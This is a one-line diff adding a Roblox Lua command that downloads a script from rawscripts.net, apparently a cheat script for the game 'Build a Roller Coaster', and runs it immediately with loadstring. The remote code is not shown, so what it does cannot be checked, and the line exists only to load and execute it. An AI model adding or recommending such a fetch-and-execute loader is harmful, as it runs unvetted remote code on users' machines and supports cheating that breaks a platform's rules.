@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Build-a-Roller-Coaster-Script-for-roblox-62007"))()
